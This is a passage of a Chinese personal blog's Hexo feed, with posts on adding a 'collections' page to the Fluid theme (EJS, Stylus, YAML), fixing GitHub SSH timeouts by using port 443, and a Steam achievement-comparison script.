class="property">banner_img_height</span></span><br><span class="line">page.<span class="property">banner_mask_alpha</span> = theme.<span class="property">collections</span>.<span class="property">banner_mask_alpha</span></span><br><span class="line">page.<span class="property">comment</span> = theme.<span class="property">collections</span>.<span class="property">comments</span>.<span class="property">type</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 标题层级，默认 h4</span></span><br><span class="line"><span class="keyword">const</span> headingLevel = <span class="title class_">Math</span>.<span class="title function_">min</span>(<span class="number">6</span>, <span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="number">2</span>, theme.<span class="property">collections</span>.<span class="property">heading_level</span> || <span class="number">4</span>))</span><br><span class="line"><span class="keyword">const</span> headingTag = <span class="string">`h<span class="subst">${headingLevel}</span>`</span></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collections-container"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  &lt;% for(const category of theme.collections.categories || []) { %&gt;</span></span><br><span class="line"><span class="language-xml">    &lt;&lt;%= headingTag %&gt; class="collection-category"&gt;</span></span><br><span class="line"><span class="language-xml">      &lt;%= category.name %&gt;</span></span><br><span class="line"><span class="language-xml">    &lt;/&lt;%= headingTag %&gt;&gt;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collection-row"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &lt;% for(const item of category.items || []) { %&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collection-card"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;%= url_for(item.link) %&gt;"</span> <span class="attr">class</span>=<span class="string">"card-body"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">rel</span>=<span class="string">"noopener"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &lt;% if (item.avatar || item.image) { %&gt;</span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collection-avatar"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&lt;%= url_for(item.avatar || item.image) %&gt;"</span> <span class="attr">alt</span>=<span class="string">"&lt;%= item.title %&gt;"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                     <span class="attr">onerror</span>=<span class="string">"this.onerror=null;this.src='&lt;%= url_for(theme.collections.onerror_avatar) %&gt;'"</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &lt;% } %&gt;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collection-content"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collection-title"</span>&gt;</span>&lt;%= item.title %&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collection-intro"</span>&gt;</span>&lt;%= item.intro || '' %&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &lt;% } %&gt;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  &lt;% } %&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;% <span class="keyword">if</span>(theme.<span class="property">collections</span>.<span class="property">custom</span> &amp;&amp; theme.<span class="property">collections</span>.<span class="property">custom</span>.<span class="property">enable</span> &amp;&amp; theme.<span class="property">collections</span>.<span class="property">custom</span>.<span class="property">content</span>) { %&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collection-custom mx-auto"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &lt;%- theme.collections.custom.content %&gt;</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;% } %&gt;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>修改之后的 <code>collections.ejs</code> 主要是将前者的关键字替换成 <code>collections</code> 并增加了一个必要的元素节点 <code>headingTag</code> 用来渲染分类标题，并取消了评论注入节点。</p><h2 id="创建styl样式文件"><a class="markdownIt-Anchor" href="#创建styl样式文件"></a> 创建 styl 样式文件</h2><p>渲染模板有了，接下来还需要创建 styl 文件用于样式定义。</p><p>友情链接的样式文件 <code>links.styl</code> 在：<code>Blog\node_modules\hexo-theme-fluid\source\css\_pages</code> 目录下的<code>_links</code> 文件夹中。</p><p>于是我们如法炮制，在<code>_pages</code> 目录下创建<code>_collections</code> 文件夹用于存放<code>_collections.styl</code> 文件。文件内容如下：</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.collections-container</span></span><br><span class="line">  <span class="attribute">padding</span> <span class="number">1rem</span></span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.collection-category</span></span><br><span class="line">    <span class="attribute">margin</span> <span class="number">1.5rem</span> <span class="number">0</span> <span class="number">0.75rem</span></span><br><span class="line">    <span class="attribute">font-size</span> <span class="number">1.5rem</span></span><br><span class="line">    <span class="attribute">font-weight</span> bold</span><br><span class="line">    <span class="attribute">border-bottom</span> <span class="number">1px</span> solid <span class="built_in">var</span>(--card-border-color)</span><br><span class="line">    <span class="attribute">color</span> <span class="built_in">var</span>(--text-color)</span><br><span class="line">    <span class="attribute">text-align</span> left</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.collection-row</span></span><br><span class="line">    <span class="attribute">display</span> flex</span><br><span class="line">    <span class="attribute">flex-wrap</span> wrap</span><br><span class="line">    <span class="attribute">gap</span> <span class="number">1rem</span></span><br><span class="line">    <span class="attribute">justify-content</span> flex-start</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.collection-card</span></span><br><span class="line">    <span class="attribute">box-shadow</span> none</span><br><span class="line">    <span class="attribute">background-color</span> transparent</span><br><span class="line">    <span class="attribute">border</span> <span class="number">0</span></span><br><span class="line">    <span class="comment">// 修改为只在桌面端生效</span></span><br><span class="line">    <span class="keyword">@media</span> (<span class="attribute">min-width</span>: <span class="number">768px</span>)</span><br><span class="line">      flex <span class="number">1</span> <span class="number">1</span> calc(<span class="number">33.333%</span> - <span class="number">1rem</span>)</span><br><span class="line">      <span class="attribute">max-width</span> calc(<span class="number">33.333%</span> - <span class="number">1rem</span>)</span><br><span class="line"></span><br><span class="line">  .card-body</span><br><span class="line">    margin <span class="number">0</span></span><br><span class="line">    padding <span class="number">1rem</span></span><br><span class="line">    border-radius .<span class="number">3rem</span></span><br><span class="line">    display flex</span><br><span class="line">    align-items flex-start  // 修改为顶部对齐</span><br><span class="line">    <span class="attribute">width</span> <span class="number">100%</span></span><br><span class="line">    <span class="attribute">min-height</span> <span class="number">80px</span>  // 替代固定高度</span><br><span class="line">    transition background-color <span class="number">0.2s</span> ease-in-out</span><br><span class="line"></span><br><span class="line">    &amp;:<span class="attribute">hover</span></span><br><span class="line">      background-color var(--card-hover-bg)</span><br><span class="line">      .collection-avatar</span><br><span class="line">        transform scale(<span class="number">1.1</span>)</span><br><span class="line"></span><br><span class="line">  .collection-avatar</span><br><span class="line">    flex none</span><br><span class="line">    <span class="attribute">width</span> <span class="number">45px</span></span><br><span class="line">    <span class="attribute">height</span> <span class="number">45px</span></span><br><span class="line">    margin-right .<span class="number">75rem</span></span><br><span class="line">    object-fit cover</span><br><span class="line">    transition-duration .<span class="number">2s</span></span><br><span class="line">    transition-timing-function ease-in-out</span><br><span class="line"></span><br><span class="line">    img</span><br><span class="line">      <span class="attribute">width</span> <span class="number">100%</span></span><br><span class="line">      <span class="attribute">height</span> <span class="number">100%</span></span><br><span class="line">      border-radius <span class="number">50%</span></span><br><span class="line">      background-color transparent</span><br><span class="line">      object-fit cover</span><br><span class="line"></span><br><span class="line">  .card-content</span><br><span class="line">    display flex</span><br><span class="line">    <span class="attribute">width</span> <span class="number">100%</span></span><br><span class="line">    // 移除固定高度</span><br><span class="line"></span><br><span class="line">  .collection-content</span><br><span class="line">    flex <span class="number">1</span></span><br><span class="line">    display flex</span><br><span class="line">    flex-direction column</span><br><span class="line">    justify-content center</span><br><span class="line">    <span class="attribute">min-width</span> <span class="number">0</span>  // 修复flex布局溢出问题</span><br><span class="line"></span><br><span class="line">  .collection-title</span><br><span class="line">    <span class="attribute">color</span> var(--text-color)</span><br><span class="line">    font-weight bold</span><br><span class="line">    // 移动端允许换行</span><br><span class="line">    @media (<span class="attribute">max-width</span>: <span class="number">767px</span>)</span><br><span class="line">      white-space normal</span><br><span class="line">      word-break break-word</span><br><span class="line">    // 桌面端单行省略</span><br><span class="line">    @media (<span class="attribute">min-width</span>: <span class="number">768px</span>)</span><br><span class="line">      overflow hidden</span><br><span class="line">      text-overflow ellipsis</span><br><span class="line">      white-space nowrap</span><br><span class="line"></span><br><span class="line">  .collection-intro</span><br><span class="line">    font-size <span class="number">0.85rem</span></span><br><span class="line">    line-height <span class="number">1.2</span></span><br><span class="line">    <span class="attribute">color</span> var(--sec-text-color)</span><br><span class="line">    // 统一使用webkit多行省略</span><br><span class="line">    display -webkit-box</span><br><span class="line">    -webkit-box-orient vertical</span><br><span class="line">    -webkit-line-clamp <span class="number">2</span></span><br><span class="line">    text-overflow ellipsis</span><br><span class="line">    overflow hidden</span><br><span class="line"></span><br><span class="line">// 移动端专属样式</span><br><span class="line">@media (<span class="attribute">max-width</span>: <span class="number">767px</span>)</span><br><span class="line">  .collection-row</span><br><span class="line">    flex-direction column</span><br><span class="line">    align-items stretch  // 改为拉伸填满</span><br><span class="line">    gap <span class="number">1.5rem</span>  // 增加垂直间距</span><br><span class="line"></span><br><span class="line">  .collection-card</span><br><span class="line">    <span class="attribute">max-width</span> <span class="number">100%</span>  // 改为<span class="number">100%</span>填充父容器</span><br><span class="line">    flex <span class="number">1</span> <span class="number">1</span> auto  // 自动伸缩</span><br><span class="line">    padding <span class="number">0</span> <span class="number">5%</span>  // 左右留白替代<span class="attribute">max-width</span></span><br><span class="line"></span><br><span class="line">    .card-body</span><br><span class="line">      padding <span class="number">1.25rem</span>  // 增加点击区域</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>该样式将会与友情链接的各小项目表现一致。例如：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202505151556536.png" alt="image-20250515155622458"></p><p>并且在移动端也将有较为良好的显示效果：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202505160609910.png" alt="image-20250516060905783"></p><h2 id="在_configfluidyml中进行配置"><a class="markdownIt-Anchor" href="#在_configfluidyml中进行配置"></a> 在_config.fluid.yml 中进行配置</h2><p>使用 ejs 渲染模板，就可以在<code>.md</code> 文档中使用 <code>layout</code> 来指定渲染，并且可以在 config 文件中进行简单配置就完成渲染。</p><p>在 fluid 的 config 文件中，配置如下：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#---------------------------</span></span><br><span class="line"><span class="comment"># 导航页</span></span><br><span class="line"><span class="comment"># collections Page</span></span><br><span class="line"><span class="comment">#---------------------------</span></span><br><span class="line"><span class="attr">collections:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">"我的收藏"</span></span><br><span class="line">  <span class="attr">subtitle:</span> <span class="string">"整理的一些有趣内容"</span></span><br><span class="line">  <span class="attr">banner_img:</span></span><br><span class="line">  <span class="attr">banner_img_height:</span> <span class="number">80</span></span><br><span class="line">  <span class="attr">banner_mask_alpha:</span> <span class="number">0.3</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 标题层级，支持 2 ~ 6，默认 4（对应 h2 ~ h6）以优化SEO</span></span><br><span class="line">  <span class="attr">heading_level:</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 标题样式配置（可选）</span></span><br><span class="line">  <span class="attr">heading_style:</span></span><br><span class="line">    <span class="attr">color:</span> <span class="string">"#333333"</span> <span class="comment"># 标题文字颜色</span></span><br><span class="line">    <span class="attr">border_bottom:</span> <span class="string">"1px solid #ddd"</span> <span class="comment"># 标题下边框样式</span></span><br><span class="line">    <span class="attr">margin:</span> <span class="string">"0 0 1rem 0"</span> <span class="comment"># 标题外边距（上右下左）</span></span><br><span class="line">    <span class="attr">font_size:</span> <span class="string">"1.25rem"</span> <span class="comment"># 标题字体大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 头像加载失败时的替代图片</span></span><br><span class="line">  <span class="attr">onerror_avatar:</span> <span class="string">/img/avatar/emo.webp</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 分类列表</span></span><br><span class="line">  <span class="attr">categories:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">"快捷访问"</span></span><br><span class="line">      <span class="attr">items:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">title:</span> <span class="string">"Can I use"</span></span><br><span class="line">          <span class="attr">link:</span> <span class="string">"https://caniuse.com/"</span></span><br><span class="line">          <span class="attr">avatar:</span> <span class="string">"https://caniuse.com/img/favicon-128.png"</span></span><br><span class="line">          <span class="attr">intro:</span> <span class="string">"前端 API 兼容性查询"</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">title:</span> <span class="string">"Squoosh"</span></span><br><span class="line">          <span class="attr">link:</span> <span class="string">"https://squoosh.app/"</span></span><br><span class="line">          <span class="attr">avatar:</span> <span class="string">"https://notes.fe-mm.com/icons/squoosh.png"</span></span><br><span class="line">          <span class="attr">intro:</span> <span class="string">"基于浏览器的本地图片压缩工具（支持自定义参数和格式转换）"</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">"周刊|博客"</span></span><br><span class="line">      <span class="attr">items:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">title:</span> <span class="string">"Frontend Weekly"</span></span><br><span class="line">          <span class="attr">link:</span> <span class="string">"https://frontender-ua.medium.com/"</span></span><br><span class="line">          <span class="attr">avatar:</span> <span class="string">"https://notes.fe-mm.com/icons/frontender-ua.png"</span></span><br><span class="line">          <span class="attr">intro:</span> <span class="string">"前端周刊"</span></span><br><span class="line">  <span class="comment"># 自定义底部HTML内容，支持HTML标签</span></span><br><span class="line">  <span class="attr">custom:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">content:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      &lt;div style="text-align:center; margin-top: 2rem;"&gt;</span></span><br><span class="line"><span class="string">        欢迎来访我的收藏页面！如果你有好用的网站，欢迎推荐～</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">  <span class="comment"># 评论设置</span></span><br><span class="line">  <span class="attr">comments:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">giscus</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>当然，你也可以使用自定义的 css 再精细的控制一下样式。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> fluid </tag>
            
            <tag> ejs </tag>
            
            <tag> styl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 通过 git 的 ssh 链接 github 超时 (time out)</title>
      <link href="/posts/10729.html"/>
      <url>/posts/10729.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><p>最近在提交 hexo 文章时，遇到了 git 通过 ssh 链接 github 超时 time out 的问题，终端上的黄字非常具有迷惑性：<mark>Error: Spawn failed!</mark></p><p>使用 <code>ssh -T git@github.com</code> 进行测试也是如此。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">ssh: connect to host github.com port 22: Connection timed out</span><br></pre></td></tr></tbody></table></figure><p>实际上是 git 在尝试使用端口 22 链接超时而已，我们可以将其改为 443 再链接。</p><h2 id="解决办法"><a class="markdownIt-Anchor" href="#解决办法"></a> 解决办法</h2><ol><li><p>找到你生成 rsa 的地方，它可能是 <code>C:\Users\Name\.ssh</code><br>还记得吗？你曾通过 <code>ssh-keygen -t rsa -C "你的git绑定的邮箱名字"</code> 这样一个命令生成了一个 rsa 文件（<a href="https://zhuanlan.zhihu.com/p/193140870">我不记得了 (≧﹏ ≦)</a>）</p></li><li><p>修改或创建一个 <code>config</code> 文件写入以下代码：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">HostName ssh.github.com</span><br><span class="line">User git</span><br><span class="line">Port 443</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br></pre></td></tr></tbody></table></figure><p>这样就能将访问的 <code>github.com</code> 转换为 <code>ssh.github.com</code></p></li></ol><p>请注意，<code>~/</code> 是你要进行填充的地方，<code>~</code> 取决于你的 rsa 的保存位置。例如：<code>C:/Users/Administrator/.ssh/id_rsa</code></p><p>完成上述操作之后你就可以通过以下命令进行尝试：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh -T git@github.com</span></span><br><span class="line">Hi 4rozeN! You've successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></tbody></table></figure><p>成功的话，它会提示你已成功通过身份验证，但 GitHub 不提供 shell 访问权限，这是正常的。</p><blockquote><p>参考文章：<a href="https://blog.csdn.net/the__future/article/details/130038818">关于本地 git 通过 ssh 链接 github 时 time out 问题的解决方法</a></p></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> git </tag>
            
            <tag> github </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Steam 游戏全成就查漏补缺脚本</title>
      <link href="/posts/39978.html"/>
      <url>/posts/39978.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><div class="note info flat"><p>项目地址 Github：<a href="https://github.com/4rozeN/diffAchievements">diffAchievements</a></p></div><h2 id="关于"><a class="markdownIt-Anchor" href="#关于"></a> 关于</h2><p>diffAchievements 是一个获取 Steam 某一个特定的游戏的已解锁成就与全成就列表进行比对得到未解锁成就列表的工具脚本。</p><p>旨在帮助玩家更好的达成某游戏的全成就，或是进行查漏补缺。</p><h2 id="我为什么需要它"><a class="markdownIt-Anchor" href="#我为什么需要它"></a> 我为什么需要它</h2><p>由于 Steam 会根据你的游戏进度或者说成就进度，将一些成就隐藏起来，这导致你无法查看全部成就详情，哪怕能查看，<strong>如果游戏成就项足够多，玩家想要知道自己还剩具体的哪些成就没完成将是一个工作负担较大的事。</strong></p><p>该脚本可以帮你省去查找已解锁成就和比对环节，你只需为脚本提供你的某个游戏的当前成就进度页面地址。</p><p>该地址应当是：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://steamcommunity.com/id/430426/stats/2358720/?tab=achievements</span><br></pre></td></tr></tbody></table></figure><p>示例图如下：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501181826412.png" alt="image-20250118182611298" style="zoom:50%;"></p><p>该页面可以在<code>个人资料-&gt;所有最近玩过的-&gt;我的游戏统计数据-&gt;我的成就</code>中找到：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501181841996.png" alt="image-20250118184103953" style="zoom:50%;"><br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501181841155.png" alt="image-20250118184157100" style="zoom:50%;"><br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501181843856.png" alt="image-20250118184303810" style="zoom:50%;"></p><h2 id="设置成就可见性"><a class="markdownIt-Anchor" href="#设置成就可见性"></a> 设置成就可见性</h2><p>为了可以通过网络请求访问到你的游戏成就详情，请在 Steam 的隐私设置中将游戏详情一项设置为公开。</p><p>这将使得你的某个游戏成就进度可以通过以下链接进行访问：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://steamcommunity.com/id/yourId/edit/settings</span><br></pre></td></tr></tbody></table></figure><p>该设置示例图为：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501181828813.png" alt="image-20250118182813774" style="zoom:50%;"></p><h2 id="准备全成就文档"><a class="markdownIt-Anchor" href="#准备全成就文档"></a> 准备全成就文档</h2><p>此项废弃，现在并不需要你准备一份全成就的列表，脚本将自动通过全球玩家成就表进行解析。</p><p><strong>请注意！</strong><mark>某些游戏在全球成就表下部分成就的说明<strong>会被隐藏</strong>，故脚本保存的部分也会隐藏。若有需要，只得自行进行搜索成就详情说明。</mark></p><h2 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h2><p>将仓库 clone 或下载到本地目录中，例如：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/4rozeN/diffAchievements.git</span><br></pre></td></tr></tbody></table></figure><p>若无法下载，可以<a href="https://wwte.lanzouu.com/i1Xyv2la600f">点这里</a>使用蓝奏云进行下载。</p><p>进入项目目录，使用 python 命令运行：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python diffAchievements.py</span><br></pre></td></tr></tbody></table></figure><p><strong>该命令要求 python 拥有环境变量。</strong></p><p>根据提示输入必要信息即可。</p><h2 id="一份使用示例"><a class="markdownIt-Anchor" href="#一份使用示例"></a> 一份使用示例</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PS E:\Coding\py\diffAchievements&gt; python .\diffAchievements.py</span><br><span class="line">请选择steam响应语言（Chinese/English）：c</span><br><span class="line">已选择中文作为Steam响应语言。</span><br><span class="line">请输入游戏的个人成就进度页面地址URL（例如：https://steamcommunity.com/id/43xxx123/stats/2358720/achievements/）：https://steamcommunity.com/id/430426/stats/578080/?tab=achievements</span><br><span class="line">是否开启代理？(y/n): y</span><br><span class="line">请输入代理地址（例如：http://127.0.0.1:7897）：http://127.0.0.1:7897</span><br><span class="line">已开启代理：http://127.0.0.1:7897</span><br><span class="line"></span><br><span class="line">请求成功，正在解析页面...</span><br><span class="line"></span><br><span class="line">正在将 unlocked_achievements 保存到当前目录下的 unlocked_achievements.txt 文件中...</span><br><span class="line">unlocked_achievements.txt 文件已保存。</span><br><span class="line">将保存的成就总数为: 19 项。</span><br><span class="line"></span><br><span class="line">请求成功，正在解析页面...</span><br><span class="line"></span><br><span class="line">正在将 all_achievements 保存到当前目录下的 all_achievements.txt 文件中...</span><br><span class="line">all_achievements.txt 文件已保存。</span><br><span class="line">将保存的成就总数为: 36 项。</span><br><span class="line"></span><br><span class="line">找到的差异成就总数为: 17 项。</span><br><span class="line"></span><br><span class="line">正在将 diff_achievements 保存到当前目录下的 diff_achievements.txt 文件中...</span><br><span class="line">diff_achievements.txt 文件已保存。</span><br><span class="line">将保存的成就总数为: 17 项。</span><br><span class="line"></span><br><span class="line">程序终了。</span><br><span class="line">PS E:\Coding\py\diffAchievements&gt;</span><br></pre></td></tr></tbody></table></figure><p>最终将生成三份 txt 文件于脚本同目录下：</p><ol><li><code>all_achievements.txt</code></li><li><code>diff_achievements.txt</code></li><li><code>unlocked_achievements.txt</code></li></ol><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script 